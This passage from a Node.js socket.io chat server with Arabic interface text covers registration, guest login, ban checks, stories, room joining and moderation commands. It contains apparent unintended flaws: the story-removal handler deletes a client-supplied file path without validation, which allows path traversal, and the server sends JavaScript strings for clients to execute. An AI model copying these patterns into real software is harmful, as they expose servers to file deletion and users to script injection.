                    if (lswit != -1) {
                      ListWait[lswit]["point"] += 1;
                    } else {
                      ListWait.push({ device: GetDevice(), point: 1 });
                    }
                    socket.emit("SEND_EVENT_EMIT_SERVER", {
                      cmd: "login",
                      data: { msg: "wrong" },
                    });
                  }
                } else {
                  socket.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "login",
                    data: { msg: "noname" },
                  });
                }
              });
            }
          );
        } else if (data["cmd"] == "SEND_EVENT_EMIT_REGISTER") {
          if (SiteSetting["register"]) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم تعطيل تسجيل العصويات مؤقتآ .. حاول لاحقآ",
              user: "",
            });
            return;
          }
          if (
            !data["data"]["username"] ||
            (!data["data"]["password"] &&
              data["data"]["username"].trim().length < 2 &&
              data["data"]["password"].trim().length < 2)
          ) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التاكد من بينات",
              user: "",
            });
            return;
          } else if (isNaN(data["data"]["username"]) == false) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التأكد من الاسم",
              user: "",
            });
            return;
          } else if (!data["data"]["username"].trim()) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء ادخال اسم",
              user: "",
            });
            return;
          } else if (
            data["data"]["username"].length > SiteSetting["registermin"]
          ) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن " +
                SiteSetting["registermin"] +
                " حرف ",
              user: "",
            });
            return;
          }

          const nonm = NoNames.findIndex((x) =>
            data["data"]["username"].includes(x)
          );
          if (nonm != -1) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "هذا الاسم ممنوع",
              user: "",
            });
            return;
          }

          UsersRepo.getBy({
            state: "getByUsername",
            username: data["data"]["username"].trim(),
          }).then((login) => {
            if (login) {
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "login",
                data: { msg: "usedname" },
              });
            } else {
              request(
                "https://get.geojs.io/v1/ip/country/" + MyIp() + ".json",
                function (err, rep, mycountry) {
									if(typeof mycountry != 'undefined'){
			if (mycountry.includes('country')) {
					    mycountry = JSON.parse(mycountry);
					}else{
						mycountry = {country:'tn'};								
					};
									}else{
										mycountry = {country:'tn'};								

									}
                  if (MyIp() && GetDevice()) {
                    if (
                      !BandSysBrow({
                        state: "register",
                        device: GetDevice(),
                        username: data["data"]["username"],
                        country: mycountry["country"],
                        refr: data["data"]["refr"] || "*",
                      })
                    ) {
                      return;
                    }
                    if (
                      BandDone({
                        statea: "vpn",
                        country: mycountry["country"],
                        verification: false,
                        state: "تسجيل|محظور|VPN",
                        topic: data["data"]["topic"],
                        username: data["data"]["username"],
                        ip: MyIp(),
                        device: GetDevice(),
                        refr: data["data"]["refr"] || "*",
                      })
                    ) {
                      return;
                    }
                    BandRepo.getBy({
                      state: "isBand",
                      username: data["data"]["username"].trim(),
                      device: GetDevice(),
                      ip: MyIp(),
                      country: mycountry["country"],
                    }).then((band) => {
                      if (band && !BandDoneCheked(MyIp())) {
                        socket.emit("SEND_EVENT_EMIT_SERVER", {
                          cmd: "login",
                          data: { msg: "banduser" },
                        });
                        SaveLogs({
                          state: band.device
                            ? "محظور|تسجيل|جهاز"
                            : band.username
                            ? "محظور|تسجيل|حساب"
                            : band.ip
                            ? "محظور|تسجيل|اي بي"
                            : band.country
                            ? "محظور|تسجيل|دولة"
                            : "",
                          topic: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          username: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          ip: MyIp(),
                          country: mycountry["country"],
                          device: GetDevice(),
                          isin: "band",
                          date: new Date().getTime(),
                        });
                        setTimeout(() => {
                          socket.disconnect();
                        }, 2000);
                        return;
                      } else {
                        if (IsBand(GetDevice()) && !BandDoneCheked(MyIp())) {
                          socket.emit("SEND_EVENT_EMIT_SERVER", {
                            cmd: "login",
                            data: { msg: "banduser" },
                          });
                          SaveLogs({
                            state: "محظور|جهاز|مشفر",
                            topic: data["data"]["username"]
                              .split("<")
                              .join("&#x3C;"),
                            username: data["data"]["username"]
                              .split("<")
                              .join("&#x3C;"),
                            ip: MyIp(),
                            country: mycountry["country"],
                            device: IsBand(GetDevice()),
                            isin: "band",
                            date: new Date().getTime(),
                          });
                          setTimeout(() => {
                            socket.disconnect();
                          }, 2000);
                          return;
                        }
                        UsersRepo.getBy({
                          state: "getAllByDevice",
                          device: GetDevice(),
                        }).then((isregister) => {
                          if (isregister.length <= SiteSetting["maxrep"]) {
                            const getToken = stringGen(177);
                            CreateUsers({
                              ip: MyIp(),
                              device: GetDevice(),
                              id: socket.id,
                              lid: stringGen(31),
                              uid: stringGen(22),
                              verification: false,
                              pic:
                                "/site/" +
                                socket.handshake.headers.host +
                                "pic.png?",
                              power: "",
                              topic: data["data"]["username"],
                              username: data["data"]["username"].trim(),
                              password: passwordHash.generate(
                                data["data"]["password"].trim()
                              ),
                              token: getToken,
                            });
                            SaveLogs({
                              state: "تسجيل|عضوية",
                              topic: data["data"]["username"]
                                .split("<")
                                .join("&#x3C;"),
                              username: data["data"]["username"]
                                .split("<")
                                .join("&#x3C;"),
                              ip: MyIp(),
                              country: mycountry["country"],
                              device: GetDevice(),
                              isin: data["data"]["refr"] || "*",
                              date: new Date().getTime(),
                            });
                            if (BandDoneCheked(MyIp())) {
                              UsersRepo.updateBy({
                                state: "updateVer",
                                verification: true,
                                username: data["data"]["username"]
                                  .split("<")
                                  .join("&#x3C;"),
                              });
                            }
                            socket.emit("SEND_EVENT_EMIT_SERVER", {
                              cmd: "login",
                              data: {
                                id: socket.id,
                                msg: "register",
                                ttoken: getToken,
                                
                                pic: "/site/pic.png?z" + getRandomInt(1, 100),
                              },
                            });
                          } else {
                            socket.emit("SEND_EVENT_EMIT_SERVER", {
                              cmd: "login",
                              data: { msg: "isreg" },
                            });
                          }
                        });
                      }
                    });
                  } else {
                    socket.disconnect();
                  }
                }
              );
            }
          });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_GUST") {
          var nameTaken = false;
          Object.keys(UserInfo).forEach(function (socketId) {
            var userInfos = UserInfo[socketId];
            if (userInfos) {
              if (
                userInfos.username.toLowerCase() ===
                data["data"]["username"].toLowerCase()
              ) {
                nameTaken = true;
              }
            }
          });

          if (SiteSetting["gust"]) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "تم تعطيل دخول الزوار مؤقتآ .. يجب عليك تسجيل عضويه",
              user: "",
            });
            return;
          } else if (
            !data["data"]["username"].trim() ||
            isNaN(data["data"]["username"]) == false
          ) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء ادخال اسم",
              user: "",
            });
            return;
          } else if (
            !data["data"]["username"] &&
            data["data"]["username"].trim().length < 2
          ) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التأكد من البيانات",
              user: "",
            });
            return;
          } else if (data["data"]["username"].length > SiteSetting["gustmin"]) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                "اسم المستخدم طويل جداً يجب ان لا يزيد الاسم عن " +
                SiteSetting["gustmin"] +
                " حرف ",
              user: "",
            });
            return;
          } else if (nameTaken) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "هذا الاسم موجود في الدردشة",
              user: "",
            });
            return;
          }

          const nonm = NoNames.findIndex((x) =>
            data["data"]["username"].includes(x)
          );
          if (nonm != -1) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "هذا الاسم ممنوع",
              user: "",
            });
            return;
          }
          const NumberEnter = ListEnter.filter(function (item) {
            return item.ip == MyIp();
          }).length;
          if (NumberEnter >= SiteSetting["maxlogin"]) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                SiteSetting["maxlogin"] + " عدد الاسماء التي يمكنك الدخول بها",
              user: "",
            });
            return;
          }

          UsersRepo.getBy({
            state: "getByUsername",
            username: data["data"]["username"].trim(),
          }).then((login) => {
            if (login) {
              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "login",
                data: { msg: "usedname" },
              });
            } else {
              request(
                "https://get.geojs.io/v1/ip/country/" + MyIp() + ".json",
                function (err, rep, mycountry) {
									if(typeof mycountry != 'undefined'){
  			if (mycountry.includes('country')) {
					    mycountry = JSON.parse(mycountry);
					}else{
						mycountry = {country:'tn'};								
					};
									}else{
						mycountry = {country:'tn'};								

									};
                  if (GetDevice() && MyIp()) {
                    if (
                      !BandSysBrow({
                        state: "gust",
                        device: GetDevice(),
                        username: data["data"]["username"],
                        country: mycountry["country"],
                        refr: data["data"]["refr"] || "*",
                      })
                    ) {
                      return;
                    }
                    if (
                      BandDone({
                        statea: "vpn",
                        country: mycountry["country"],
                        verification: false,
                        state: "زائر|محظور|VPN",
                        topic: data["data"]["username"],
                        username: data["data"]["username"],
                        ip: MyIp(),
                        device: GetDevice(),
                        refr: data["data"]["refr"] || "*",
                      })
                    ) {
                      return;
                    }
                    BandRepo.getBy({
                      state: "isBand",
                      username: data["data"]["username"].trim(),
                      device: GetDevice(),
                      ip: MyIp(),
                      country: mycountry["country"],
                    }).then((band) => {
                      if (band) {
                        socket.emit("SEND_EVENT_EMIT_SERVER", {
                          cmd: "login",
                          data: { msg: "banduser" },
                        });
                        SaveLogs({
                          state: band.device
                            ? "محظور|زائر|جهاز"
                            : band.username
                            ? "محظور|زائر|حساب"
                            : band.ip
                            ? "محظور|زائر|اي بي"
                            : band.country
                            ? "محظور|زائر|دولة"
                            : "",
                          topic: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          username: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          ip: MyIp(),
                          country: mycountry["country"],
                          device: GetDevice(),
                          isin: data["data"]["refr"].split("<").join("&#x3C;"),
                          date: new Date().getTime(),
                        });
                        setTimeout(() => {
                          socket.disconnect();
                        }, 2000);
                        return;
                      } else {
                        if (IsBand(GetDevice())) {
                          socket.emit("SEND_EVENT_EMIT_SERVER", {
                            cmd: "login",
                            data: { msg: "banduser" },
                          });
                          SaveLogs({
                            state: "محظور|جهاز|مشفر",
                            topic: data["data"]["username"]
                              .split("<")
                              .join("&#x3C;"),
                            username: data["data"]["username"]
                              .split("<")
                              .join("&#x3C;"),
                            ip: MyIp(),
                            country: mycountry["country"],
                            device: IsBand(GetDevice()),
                            isin: data["data"]["refr"]
                              .split("<")
                              .join("&#x3C;"),
                            date: new Date().getTime(),
                          });
                          setTimeout(() => {
                            socket.disconnect();
                          }, 2000);
                          return;
                        }
                        const mytoken = stringGen(177);
                        const idreg = getRandomInt(1, 100);
                        socket.emit("SEND_EVENT_EMIT_SERVER", {
                          cmd: "login",
                          data: {
                            uid: "",
                            id: socket.id,
                            room: MyRoom(GetDevice()),
                            msg: "ok",
                            ttoken: mytoken,
                            pic: "/site/pic.png?z" + getRandomInt(1, 100),
                          },
                        });
                        SaveNames({
                          iduser: idreg,
                          device: GetDevice(),
                          ip: MyIp(),
                          topic: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          username: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                        });
                        EnterUserGust({
                          loginG: false,
                          eva: 0,
                          stat: 0,
                          islogin: "زائر",
                          refr: data["data"]["refr"].split("<").join("&#x3C;"),
                          username: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          ucol: "#000000",
                          mcol: "#000000",
                          mscol: "#000000",
                          atar: "",
                          back:"",
                          ifedit: false,
                          bg: "#ffffff",
                          copic: "#ffffff",
                          rep: 0,
                          ico: "",
                          youtube:'',
                          islike: [],
                          idreg: "#" + idreg,
                          topic: data["data"]["username"]
                            .split("<")
                            .join("&#x3C;"),
                          country: mycountry["country"] || "sg",
                          ip: MyIp(),
                          lid: stringGen(31),
                          uid: stringGen(22),
                          token: mytoken,
                          id: socket.id,
                          islog: false,
                          ismuted: isMuted(GetDevice()),
                          ismutedbc: isBandBc(GetDevice()),
                          power: "",
                          documents: 0,
                          device: GetDevice(),
                          pic: "/site/" +
                          socket.handshake.headers.host +
                          "pic.png?" + getRandomInt(1, 100),
                          idroom: MyRoom(GetDevice()),
                          msg: "( غير مسجل )",
                          youtube: "",
                          stealth: false,
                        });
                      }
                    });
                  }
                }
              );
            }
          });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_REMOVE_STORY") {
          if (
            typeof data["data"]["id"] != "number" ||
            typeof data["data"]["id2"] != "string" ||
            typeof data["data"]["url"] != "string"
          ) {
            return;
          }
          if (UserInfo[socket.id]) {
            StoryRepo.deleted({
              id: data["data"]["id"],
              owner: data["data"]["id2"],
            }).then((delstory) => {
              io.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "story-",
                data: data["data"]["id"],
              });
              fs.unlink("uploads" + data["data"]["url"], (err) => {
                if (err) {
                }
              });
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_GET_STORY") {
          StoryRepo.getBy({ state: "getAll", limit: 30 }).then((story) => {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "story",
              data: story,
            });
          });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_TOP_BAR") {
          UsersRepo.getBy({ state: "getTop" }).then((res) => {
            socket.emit("SEND_EVENT_EMIT_SERVER", { cmd: "topbar", data: res });
          });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_ADD_STORY") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["type"] != "string" ||
              typeof data["data"]["url"] != "string" ||
              typeof data["data"]["time"] != "number"
            ) {
              return;
            } else if (
              UserInfo[socket.id]["rep"] < SiteSetting["maxlikealert"]
            ) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  SiteSetting["maxlikestory"] +
                  " عدد الايكات المطلوبة لإنشاء قصة ",
                user: "",
              });
              return;
            }

            StoryRepo.getBy({
              state: "getOwner",
              owner: UserInfo[socket.id]["lid"],
            }).then((isstory) => {
              if (isstory.length >= 5) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "يمكنك إنشاء 5 قصص كل 24 ساعة",
                  user: "",
                });
              } else {
                StoryRepo.create({
                  owner: UserInfo[socket.id]["lid"],
                  topic: UserInfo[socket.id]["topic"],
                  pic: UserInfo[socket.id]["pic"],
                  type: data["data"]["type"],
                  time: data["data"]["time"],
                  url: data["data"]["url"],
                }).then((res) => {
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "story+",
                    data: {
                      id: res["id"],
                      owner: UserInfo[socket.id]["lid"],
                      topic: UserInfo[socket.id]["topic"],
                      pic: UserInfo[socket.id]["pic"],
                      type: data["data"]["type"],
                      time: data["data"]["time"],
                      url: data["data"]["url"],
                      date: new Date(),
                    },
                  });
                });
              }
            });
          }
        } else if (data["cmd"] == "a") {
          if (
            typeof data["data"]["cmd"] != "string" ||
            typeof data["data"]["id"] != "string"
          ) {
            return;
          }
          if (UserInfo[socket.id]) {
            if (data["data"]["cmd"] == "check") {
              io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "a",
                data: data["data"],
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_RJOIN_ROOM") {
          if (typeof data["data"]["id"] == "string") {
            if (UserInfo[socket.id]) {
             
              if (data["data"]["id"] == UserInfo[socket.id]["idroom"]) {
                return;
              }
              
              const iszeros = OnlineUser.filter((a) => a.roomid == UserInfo[socket.id]["idroom"]);
              const maxroom = OnlineUser.filter((a) => a.roomid == data["data"]["id"]);
              const roomInfo = GetRoomList(data["data"]["id"]);
             
              if ((maxroom.length >= roomInfo.max && !GetPower(UserInfo[socket.id]["power"])["grupes"]) && UserInfo[socket.id]["power"] != 'Hide') {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "هذه الغرفة ممتلئة",
                  user: "",
                });
                return;
              }
              if (UserInfo[socket.id]["idroom"]) {
                if (
                  !GetRoomList(UserInfo[socket.id]["idroom"])["deleted"] &&
                  iszeros.length == 1
                ) {
                  RoomsRepo.deleted(UserInfo[socket.id]["idroom"]).then(
                    (res) => {
                      if (res) {
                        io.emit("SEND_EVENT_EMIT_SERVER", {
                          cmd: "r-",
                          data: UserInfo[socket.id]["idroom"],
                        });
                        RefreshRooms(1);
                      }
                    }
                  );
                }
              }
              if (
                GetRoomList(data["data"]["id"])["pass"] !== data["data"]["pwd"] &&
                GetRoomList(data["data"]["id"])["needpass"] &&
                !GetPower(UserInfo[socket.id]["power"])["grupes"]
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "الرقم السري لدخول الغرفة خاطئ",
                  user: "",
                });
                return;
              }
              
              if (GetRoomList(data["data"]["id"])["nohide"]) {
                if (UserInfo[socket.id]["power"] === "Hide") {
                } else if (
                  GetPower(UserInfo[socket.id]["power"])["stealth"] &&
                  UserInfo[socket.id]["stealth"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذه الغرفة لا تسمح بالدخول بصلاحية المخفي",
                    user: "",
                  });
                  return;
                }
              }
              
              if (
                isBandRoom({
                  device: UserInfo[socket.id]["device"],
                  room: data["data"]["id"],
                })
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "تم حظرك من الغرفة مؤقتا",
                  user: "",
                });
                return;
              }
              
              if (UserInfo[socket.id]["rep"] < GetRoomList(data["data"]["id"])["rmli"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg:
                    "يجب أن تتوفر على " +
                    GetRoomList(data["data"]["id"])["rmli"] +
                    " إعجاب حتى تتمكن من الدخول الى هذه الغرفة",
                  user: "",
                });
                return;
              }              
              if (UserInfo[socket.id]["idroom"]) {
                if (GetRoomList(UserInfo[socket.id]["idroom"])["broadcast"]) {
                  io.to(UserInfo[socket.id]["idroom"]).emit(
                    "SEND_EVENT_EMIT_BROADCASTING",
                    { cmd: "rleave", user: socket.id }
                  );
                  for (var i = 1; i < 8; i++) {
                    if (
                      PeerRoom[UserInfo[socket.id]["idroom"]][i].id == socket.id
                    ) {
                      PeerRoom[UserInfo[socket.id]["idroom"]][i].id = "";
                      PeerRoom[UserInfo[socket.id]["idroom"]][i].ev = false;
                      PeerRoom[UserInfo[socket.id]["idroom"]][i].us = {};
                    }
                  }
                }
              }
              if (
                GetPower(UserInfo[socket.id]["power"])["stealth"] &&
                UserInfo[socket.id]["stealth"]
              ) {
              } else {
                socket
                  .to(UserInfo[socket.id]["idroom"])
                  .emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "msg",
                    data: {
                      bg: "none",
                      copic: "none",
                      class: "hmsg",
                      id: UserInfo[socket.id]["id"],
                      topic: UserInfo[socket.id]["topic"],
                      msg:
                        "هذا المستخدم انتقل الى" +
                        '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:1px;max-width:180px;min-width:60px;" onclick="Send_Rjoin(\'' +
                        GetRoomList(data["data"]["id"])["id"] +
                        "')\">" +
                        GetRoomList(data["data"]["id"])["topic"] +
                        "</div>",
                      roomid: UserInfo[socket.id]["idroom"],
                      pic: UserInfo[socket.id]["pic"],
                      uid: socket.id,
                    },
                  });

                socket.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "msg",
                  data: {
                    bg: "none",
                    copic: "none",
                    class: "hmsg",
                    id: UserInfo[socket.id]["id"],
                    topic: UserInfo[socket.id]["topic"],
                    msg:
                      "هذا المستخدم انتقل الى" +
                      '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:1px;max-width:180px;min-width:60px;" onclick="Send_Rjoin(\'' +
                      GetRoomList(data["data"]["id"])["id"] +
                      "')\">" +
                      GetRoomList(data["data"]["id"])["topic"] +
                      "</div>",
                    roomid: UserInfo[socket.id]["idroom"],
                    pic: UserInfo[socket.id]["pic"],
                    uid: socket.id,
                  },
                });

                io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "msg",
                  data: {
                    bg: "none",
                    copic: "none",
                    class: "hmsg",
                    id: UserInfo[socket.id]["id"],
                    topic: UserInfo[socket.id]["topic"],
                    msg:
                      " هذا المستخدم قد دخل الغرفة" +
                      '<div class="fl fa fa-sign-in btn btn-primary dots roomh border corner" style="padding:1px;max-width:180px;min-width:60px;" onclick="Send_Rjoin(\'' +
                      GetRoomList(data["data"]["id"])["id"] +
                      "')\">" +
                      GetRoomList(data["data"]["id"])["topic"] +
                      "</div>",
                    roomid: data["data"]["id"],
                    pic: UserInfo[socket.id]["pic"],
                    uid: socket.id,
                  },
                });
              }

              if (GetRoomList(data["data"]["id"])["welcome"]) {
                socket.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "msg",
                  data: {
                    bg: "none",
                    copic: "none",
                    mcol: "#000",
                    ucol: "#ff0000",
                    id: GetRoomList(data["data"]["id"])["id"],
                    topic: GetRoomList(data["data"]["id"])["topic"],
                    msg: ReplaceEktisar(
                      GetRoomList(data["data"]["id"])["welcome"]
                    ),
                    pic: GetRoomList(data["data"]["id"])["pic"],
                  },
                });
              }
              if (UserInfo[socket.id]["idroom"]) {
                socket.leave(UserInfo[socket.id]["idroom"]);
              }
              setTimeout(() => {
                if (UserInfo[socket.id]) {
                  UserInfo[socket.id]["idroom"] = data["data"]["id"];
                }
              }, 500);
              const picdiax = OnlineUser.findIndex((x) => x.id == socket.id);
              if (picdiax != -1) {
                OnlineUser[picdiax]["roomid"] = data["data"]["id"];
              }

              socket.join(data["data"]["id"]);
              io.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "ur",
                data: [socket.id, data["data"]["id"]],
              });
              if (GetRoomList(data["data"]["id"])["broadcast"]) {
                io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_BROADCASTING", {
                  cmd: "rjoin",
                  user: socket.id,
                });
                socket.emit("SEND_EVENT_EMIT_BROADCASTING", {
                  cmd: "all",
                  room: data["data"]["id"],
                  data: PeerRoom[data["data"]["id"]],
                });
              }
            }
          }
            } else if (data["cmd"] == "SEND_EVENT_EMIT_ACTION") {
          if (typeof data["data"]["id"] == "string") {
            if (UserInfo[socket.id] && UserInfo[data["data"]["id"]]) {
              if (data["data"]["cmd"] == "like") {
                const islike = UserInfo[socket.id]["islike"].findIndex(
                  (x) => x == data["data"]["id"]
                );
                if (islike != -1) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "يمكنك ارسال إعجاب مره واحده في الدقيقه",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "إعجاب",
                  force: 1,
                  msg: `حصلت على إعجاب <i class="fa fa-heart" style="color:red;"></i>`,
                  user: socket.id,
                });
                const likeme = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (likeme != -1) {
                  OnlineUser[likeme]["rep"] += 1;
                  UserInfo[data["data"]["id"]]["rep"] += 1;
                  UserInfo[socket.id]["islike"].push(data["data"]["id"]);
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "u^",
                    data: OnlineUser[likeme],
                  });
                }
                setTimeout(function () {
                  if (UserInfo[socket.id]) {
                    UserInfo[socket.id]["islike"].splice(
                      UserInfo[socket.id]["islike"].findIndex(
                        (v) => v == data["data"]["id"]
                      ),
                      1
                    );
                  }
                }, 60000 * Config.timeLike);
              } else if (data["data"]["cmd"] == "kick") {
                if (!GetPower(UserInfo[socket.id]["power"])["kick"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم طردك من الدردشة",
                  user: "",
                });
                MessagesList({
                  state: "LogsMsg",
                  bg: "none",
                  copic: "none",
                  class: "hmsg",
                  id: data["data"]["id"],
                  topic: UserInfo[data["data"]["id"]]["topic"],
                  msg: "( تم طرد هذا المستخدم )",
                  idroom: UserInfo[data["data"]["id"]]["idroom"],
                  pic: UserInfo[data["data"]["id"]]["pic"],
                });

                UserInfo[data["data"]["id"]]["ismsg"] = true;
                SaveStats({
                  state: "طرد",
                  topic: UserInfo[socket.id]["topic"],
                  ip: UserInfo[socket.id]["ip"],
                  username: UserInfo[data["data"]["id"]]["topic"],
                  room: UserInfo[data["data"]["id"]]["idroom"]
                    ? GetRoomList(UserInfo[data["data"]["id"]]["idroom"])[
                        "topic"
                      ]
                    : "out room",
                  time: new Date().getTime(),
                });

                UserDisconnect({ id: data["data"]["id"], state: 2 });
                io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "ev",
                  data: 'window.onbeforeunload = null; location.href="/";',
                });
              } else if (data["data"]["cmd"] == "sendVoice") {
                if (typeof data["data"]["voice"] != "object") {
                  return;
                } else if (UserInfo[data["data"]["id"]]["offline"]) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "المستخدم غير متصل بالانترنت في الوقت الحالي",
                    user: "",
                  });
                  return;
                }

                let fileName = stringGen(20) + ".wav";
                fs.writeFileSync(
                  "uploads/recorder/" + fileName,
                  data["data"]["voice"],
                  "utf8"
                );
                setTimeout(function () {
                  socket.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "pmf",
                    data: {
                      file: "/recorder/" + fileName,
                      id: data["data"]["id"],
                    },
                  });
                }, 1000);
              } else if (data["data"]["cmd"] == "ban") {
                if (typeof data["data"]["reponse"] != "string") {
                  return;
                } else if (!GetPower(UserInfo[socket.id]["power"])["ban"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: "تم حظرك من الدردشة",
                  user: "",
                });

                MessagesList({
                  state: "LogsMsg",
                  bg: "none",
                  copic: "none",
                  class: "hmsg",
                  id: data["data"]["id"],
                  topic: UserInfo[data["data"]["id"]]["topic"],
                  msg: "( تم حظر هذا المستخدم )",
                  idroom: UserInfo[data["data"]["id"]]["idroom"],
                  pic: UserInfo[data["data"]["id"]]["pic"],
                });

                UserInfo[data["data"]["id"]]["ismsg"] = true;
	 BandUser({
										 name_band: UserInfo[data['data']['id']]['username'],
										 logs:'باند',
										 type:  " من قبل " + UserInfo[socket.id]['username'],
										 reponse: data['data']['reponse'] || 'لا يوجد سبب',
										 device: UserInfo[data['data']["id"]]['device'],
										 username: UserInfo[data['data']["id"]]['username'],
										 ip: UserInfo[data['data']["id"]]['ip'],
										 country: '',
										 topic:UserInfo[socket.id]['username'],
										 myuser:UserInfo[data['data']['id']]['username'],
										 myip:UserInfo[socket.id]['ip']
									 });
                UserDisconnect({ id: data["data"]["id"], state: 2 });
                io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "ev",
                  data: 'window.onbeforeunload = null; location.href="/";',
                });
              } else if (data["data"]["cmd"] == "meiut") {
                if (!GetPower(UserInfo[socket.id]["power"])["meiut"]) {
                  return;
                } else if (
                  GetPower(UserInfo[data["data"]["id"]]["power"])["rank"] >
                  GetPower(UserInfo[socket.id]["power"])["rank"]
                ) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "هذا المستخدم اعلى منك رتبة",
                    user: "",
                  });
                  return;
                }
                if (UserInfo[data["data"]["id"]]["ismuted"]) {
                  UserInfo[data["data"]["id"]]["ismuted"] = false;
                } else {
                  UserInfo[data["data"]["id"]]["ismuted"] = true;
                }
                SendNotification({
                  id: data["data"]["id"],
                  state: "to",
                  topic: "",
                  force: 1,
                  msg: UserInfo[data["data"]["id"]]["ismuted"]
                    ? "تم منعك من الحديث في الدردشة"
                    : "تم السماح لك بالحديث في الدردشة",
                  user: "",
                });
                const ismue = OnlineUser.findIndex(
                  (x) => x.id == data["data"]["id"]
                );
                if (ismue != -1) {
                  OnlineUser[ismue]["meiut"] =
